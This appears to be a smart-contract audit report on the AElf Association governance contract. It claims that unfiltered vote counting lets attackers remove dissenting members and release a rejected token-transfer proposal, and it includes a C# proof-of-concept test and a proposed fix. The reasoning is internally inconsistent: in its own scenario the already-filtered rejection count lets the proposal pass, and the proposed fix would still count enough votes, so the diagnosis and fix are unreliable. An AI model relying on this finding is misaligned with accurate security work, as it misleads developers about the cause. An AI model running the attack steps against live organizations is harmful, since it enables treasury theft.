# Audit Report

## Title
Vote Counting Inconsistency Allows Governance Bypass via Strategic Member Removal

## Summary
The `CheckEnoughVoteAndApprovals` function in the Association contract contains a critical logic inconsistency where approval, rejection, and abstention vote counts are filtered by current organization membership, but the total vote threshold check counts ALL votes including those from removed members. This allows attackers to manipulate governance by removing dissenting voters after they cast their votes, enabling malicious proposals to pass despite originally being rejected.

## Finding Description

The vulnerability exists in the vote counting logic that determines whether a proposal can be released. The system implements four separate vote count checks with inconsistent membership filtering:

**Filtered Checks (Correct):**
The approval counting correctly filters by current membership [1](#0-0) 

The rejection counting correctly filters by current membership [2](#0-1) 

The abstention counting correctly filters by current membership [3](#0-2) 

**Unfiltered Check (Vulnerability):**
The MinimalVoteThreshold check counts ALL votes without filtering by current membership [4](#0-3) 

This inconsistency is exploitable because organizations can remove members via the `RemoveMember` function, which is callable by the organization itself through proposal execution [5](#0-4) 

The `Release` method uses `IsReleaseThresholdReached` to validate proposals [6](#0-5) , which in turn calls the vulnerable `CheckEnoughVoteAndApprovals` function [7](#0-6) 

**Attack Scenario:**
1. Organization has 10 members with thresholds: MinimalApprovalThreshold=5, MinimalVoteThreshold=8, MaximalRejectionThreshold=3
2. Malicious proposal receives 5 approvals and 4 rejections (total 9 votes)
3. Proposal is blocked because 4 rejections > 3 (MaximalRejectionThreshold)
4. Attackers pass a proposal via `ChangeOrganizationThreshold` to reduce MinimalVoteThreshold from 8 to 5 (valid with 10 members)
5. Attackers pass proposals to remove the 4 rejecting members via `RemoveMember`
6. Organization now has 6 members; validation passes (MinimalVoteThreshold=5 ≤ 6 members)
7. Original malicious proposal is re-evaluated:
   - Rejections filtered by current membership: 0 (removed members) ≤ 3 ✓
   - Approvals filtered by current membership: 5 ≥ 5 ✓
   - Total votes WITHOUT filtering: 9 ≥ 5 ✓
8. Proposal now passes and can be released, despite originally being rejected

## Impact Explanation

**Governance Integrity Violation:** This vulnerability fundamentally breaks the rejection mechanism in Association-based governance. Removed members' votes artificially inflate participation counts while their rejections/abstentions are ignored, allowing proposals that legitimately failed to pass.

**Concrete Impacts:**
- **Unauthorized Proposal Execution:** Attackers can execute arbitrary contract calls that were properly rejected by organization members
- **Treasury Theft:** Organizations controlling funds can have their assets stolen via malicious transfer proposals
- **Configuration Hijacking:** Critical system configurations governed by Association contracts can be maliciously modified
- **Governance Capture:** Once attackers achieve initial control to remove dissenters, they can maintain indefinite control by removing any new opposing members

**Affected Systems:**
- All Association-governed organizations including multi-signature wallets, DAOs, and committee-based governance structures
- Cross-chain governance if Association contracts control bridge operations
- Treasury and economic contracts managed by Association organizations
- System upgrades and configuration changes requiring Association approval

## Likelihood Explanation

**Attacker Prerequisites:**
- Control of sufficient members to meet MinimalApprovalThreshold (typically ~50% of organization)
- Membership in ProposerWhiteList (standard for organization members)
- Coordination to pass initial member removal proposals

**Attack Complexity: MEDIUM**
The attack requires multiple sequential steps but uses only standard contract functions:
1. Pass proposal to adjust MinimalVoteThreshold via `ChangeOrganizationThreshold`
2. Pass proposals to remove dissenting members via `RemoveMember`
3. Release previously-blocked malicious proposal

All steps use legitimate governance mechanisms without requiring special permissions beyond normal organization membership.

**Feasibility: HIGH for valuable organizations**
- Organizations with significant treasury holdings (>$100K) present strong economic incentives
- Insider threats or coordinated attacks can achieve the required ~50% initial control
- No on-chain detection mechanisms exist for this attack pattern
- Attack appears as normal governance activity until malicious proposal executes

**Economic Rationality:**
- Cost: Minimal (only gas fees for proposals and voting)
- Benefit: Complete governance control, access to treasury, arbitrary contract execution
- Risk/Reward: Extremely favorable for high-value targets

## Recommendation

Fix the vote counting inconsistency by filtering the MinimalVoteThreshold check by current organization membership, consistent with the other vote counting logic:

```csharp
private bool CheckEnoughVoteAndApprovals(ProposalInfo proposal, Organization organization)
{
    var approvedMemberCount = proposal.Approvals.Count(organization.OrganizationMemberList.Contains);
    var isApprovalEnough =
        approvedMemberCount >= organization.ProposalReleaseThreshold.MinimalApprovalThreshold;
    if (!isApprovalEnough)
        return false;

    // FIX: Filter total vote count by current membership
    var currentMemberVoteCount = proposal.Abstentions
        .Concat(proposal.Approvals)
        .Concat(proposal.Rejections)
        .Count(organization.OrganizationMemberList.Contains);
    
    var isVoteThresholdReached = 
        currentMemberVoteCount >= organization.ProposalReleaseThreshold.MinimalVoteThreshold;
    return isVoteThresholdReached;
}
```

This ensures that only votes from current organization members count toward all thresholds, preventing the exploitation of votes from removed members.

## Proof of Concept

```csharp
[Fact]
public async Task VoteCountingInconsistency_BypassRejectionViaRemoveMember()
{
    // Setup: Create 10-member organization
    var members = Enumerable.Range(0, 10).Select(i => SampleAddress.AddressList[i]).ToList();
    
    var createInput = new CreateOrganizationInput
    {
        OrganizationMemberList = new OrganizationMemberList { OrganizationMembers = { members } },
        ProposerWhiteList = new ProposerWhiteList { Proposers = { members } },
        ProposalReleaseThreshold = new ProposalReleaseThreshold
        {
            MinimalApprovalThreshold = 5,
            MinimalVoteThreshold = 8,
            MaximalRejectionThreshold = 3,
            MaximalAbstentionThreshold = 3
        }
    };
    
    var orgAddress = (await AssociationContractStub.CreateOrganization.SendAsync(createInput)).Output;
    
    // Create malicious proposal
    var maliciousProposal = (await AssociationContractStub.CreateProposal.SendAsync(
        new CreateProposalInput
        {
            OrganizationAddress = orgAddress,
            ToAddress = TokenContractAddress,
            ContractMethodName = nameof(TokenContractStub.Transfer),
            Params = new TransferInput { To = members[0], Amount = 1000000, Symbol = "ELF" }.ToByteString(),
            ExpiredTime = TimestampHelper.GetUtcNow().AddDays(1)
        })).Output;
    
    // Vote: 5 approve, 4 reject (exceeds MaximalRejectionThreshold)
    for (int i = 0; i < 5; i++)
        await GetAssociationContractTester(members[i]).Approve.SendAsync(maliciousProposal);
    for (int i = 5; i < 9; i++)
        await GetAssociationContractTester(members[i]).Reject.SendAsync(maliciousProposal);
    
    // Verify proposal is blocked by rejections
    var proposalOutput = await AssociationContractStub.GetProposal.CallAsync(maliciousProposal);
    proposalOutput.ToBeReleased.ShouldBeFalse(); // Correctly blocked
    
    // Attack Step 1: Reduce MinimalVoteThreshold via proposal
    var thresholdProposal = (await AssociationContractStub.CreateProposal.SendAsync(
        new CreateProposalInput
        {
            OrganizationAddress = orgAddress,
            ToAddress = AssociationContractAddress,
            ContractMethodName = nameof(AssociationContractStub.ChangeOrganizationThreshold),
            Params = new ProposalReleaseThreshold
            {
                MinimalApprovalThreshold = 5,
                MinimalVoteThreshold = 5, // Reduced from 8
                MaximalRejectionThreshold = 3,
                MaximalAbstentionThreshold = 3
            }.ToByteString(),
            ExpiredTime = TimestampHelper.GetUtcNow().AddDays(1)
        })).Output;
    
    for (int i = 0; i < 5; i++)
        await GetAssociationContractTester(members[i]).Approve.SendAsync(thresholdProposal);
    await GetAssociationContractTester(members[0]).Release.SendAsync(thresholdProposal);
    
    // Attack Step 2: Remove rejecting members
    for (int i = 5; i < 9; i++)
    {
        var removeProposal = (await AssociationContractStub.CreateProposal.SendAsync(
            new CreateProposalInput
            {
                OrganizationAddress = orgAddress,
                ToAddress = AssociationContractAddress,
                ContractMethodName = nameof(AssociationContractStub.RemoveMember),
                Params = members[i].ToByteString(),
                ExpiredTime = TimestampHelper.GetUtcNow().AddDays(1)
            })).Output;
        
        for (int j = 0; j < 5; j++)
            await GetAssociationContractTester(members[j]).Approve.SendAsync(removeProposal);
        await GetAssociationContractTester(members[0]).Release.SendAsync(removeProposal);
    }
    
    // Verify: Original malicious proposal now passes despite rejections
    proposalOutput = await AssociationContractStub.GetProposal.CallAsync(maliciousProposal);
    proposalOutput.ToBeReleased.ShouldBeTrue(); // VULNERABILITY: Now releasable!
    
    // Malicious proposal can be executed
    await GetAssociationContractTester(members[0]).Release.SendAsync(maliciousProposal);
}
```

### Citations

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L31-31)
```csharp
        return !isAbstained && CheckEnoughVoteAndApprovals(proposal, organization);
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L36-37)
```csharp
        var rejectionMemberCount =
            proposal.Rejections.Count(organization.OrganizationMemberList.Contains);
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L43-43)
```csharp
        var abstentionMemberCount = proposal.Abstentions.Count(organization.OrganizationMemberList.Contains);
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L49-49)
```csharp
        var approvedMemberCount = proposal.Approvals.Count(organization.OrganizationMemberList.Contains);
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L55-57)
```csharp
        var isVoteThresholdReached =
            proposal.Abstentions.Concat(proposal.Approvals).Concat(proposal.Rejections).Count() >=
            organization.ProposalReleaseThreshold.MinimalVoteThreshold;
```

**File:** contract/AElf.Contracts.Association/Association.cs (L188-188)
```csharp
        Assert(IsReleaseThresholdReached(proposalInfo, organization), "Not approved.");
```

**File:** contract/AElf.Contracts.Association/Association.cs (L266-280)
```csharp
    public override Empty RemoveMember(Address input)
    {
        var organization = State.Organizations[Context.Sender];
        Assert(organization != null, "Organization not found.");
        var removeResult = organization.OrganizationMemberList.OrganizationMembers.Remove(input);
        Assert(removeResult, "Remove member failed.");
        Assert(Validate(organization), "Invalid organization.");
        State.Organizations[Context.Sender] = organization;
        Context.Fire(new MemberRemoved
        {
            OrganizationAddress = Context.Sender,
            Member = input
        });
        return new Empty();
    }
```
